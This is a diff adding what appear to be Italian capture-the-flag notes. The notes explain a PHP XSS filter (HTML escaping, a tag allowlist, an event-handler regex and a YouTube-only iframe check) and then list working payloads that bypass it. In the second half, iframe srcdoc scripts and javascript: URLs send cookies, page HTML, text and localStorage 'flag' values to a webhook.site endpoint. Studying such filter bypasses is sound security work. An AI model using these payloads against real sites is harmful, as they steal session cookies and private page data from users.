@@ -1,0 +1,90 @@
+1. htmlspecialchars($_GET['asd'], ENT_NOQUOTES);
+Cosa fa:
+Converte i caratteri speciali HTML in entità, per evitare esecuzione di codice HTML.
+< diventa &lt;
+> diventa &gt;
+" resta uguale (perché ENT_NOQUOTES)
+
+Esempio:
+Input: <b>test</b>
+Risultato iniziale: &lt;b&gt;test&lt;/b&gt;
+
+2. preg_replace('/&lt;(\/?((strong)|(em)|(b)|(i)|(iframe)|(img)){1}(\s((?!&gt;).)*)*)&gt;/i', '<\1>', $message);
+Cosa fa:
+Permette solo alcuni tag HTML (strong, em, b, i, iframe, img) e li ripristina da entità HTML a veri tag.
+
+Esempio:
+Input: &lt;b&gt;Hello&lt;/b&gt;
+Output: <b>Hello</b> ✅
+Ma: &lt;script&gt; non viene trasformato
+
+3. preg_replace('/(on[a-z]*=)((?!>).)*>/i', '\1"nice try">', $message);
+Cosa fa:
+Blocca eventi JavaScript nei tag HTML, tipo onclick=, onload=, ecc.
+Sostituisce ogni evento JS con ="nice try" per disinnescarlo.
+
+Esempio:
+Input: <img src=x onerror=alert(1)>
+Diventa: <img src=x onerror="nice try">
+
+4. (Controllo iframe YouTube)
+php
+Copia
+Modifica
+if(preg_match('/<iframe ((?!>).)*src=["\']([a-zA-Z0-9\/\.:]*)["\']/', $message, $iframe_url)) {
+    if(!preg_match('/^https:\/\/www.youtube.com\/embed\//', $iframe_url[2])) {
+        $message = str_replace($iframe_url[2], 'only youtube videos allowed', $message);
+    }
+}
+Cosa fa:
+Permette solo iframe con src="https://www.youtube.com/embed/...".
+Se provi un altro link (es. evil.com), sostituisce l’URL con la scritta:
+
+only youtube videos allowed
+
+
+
+
+<iframe srcdoc="
+  <script>
+    let url = 'https://webhook.site/84cfa616-56c1-4369-9b23-64103e615218?';
+    fetch(url + 'body=' + encodeURIComponent(document.body.innerText));
+  </script>
+"></iframe>
+
+<iframe srcdoc="
+  <script>
+    let url = 'https://webhook.site/84cfa616-56c1-4369-9b23-64103e615218?';
+    fetch(url + 'html=' + encodeURIComponent(document.documentElement.innerHTML));
+  </script>
+"></iframe>
+
+<iframe srcdoc="
+  <script>
+    let url = 'https://webhook.site/84cfa616-56c1-4369-9b23-64103e615218?';
+    fetch(url + 'storage=' + encodeURIComponent(localStorage.getItem('flag')));
+  </script>
+"></iframe>
+
+<iframe srcdoc="
+  <script>
+    let url = 'https://webhook.site/84cfa616-56c1-4369-9b23-64103e615218?';
+    fetch(url + 'cookie=' + encodeURIComponent(document.cookie));
+  </script>
+"></iframe>
+
+<iframe src="javascript:
+  fetch('https://webhook.site/84cfa616-56c1-4369-9b23-64103e615218?d=' +
+    btoa(
+      document.cookie + '||' +
+      document.body.innerText + '||' +
+      document.documentElement.innerHTML + '||' +
+      (localStorage.flag || '') + '||' +
+      (window.flag || '')
+    )
+  )
+"></iframe>
+
+<iframe src="javascript:fetch('https://webhook.site/84cfa616-56c1-4369-9b23-64103e615218?d='+window)"></iframe>
+
+<iframe src="javascript:fetch('https://webhook.site/84cfa616-56c1-4369-9b23-64103e615218?data='+btoa(document.cookie))"></iframe>
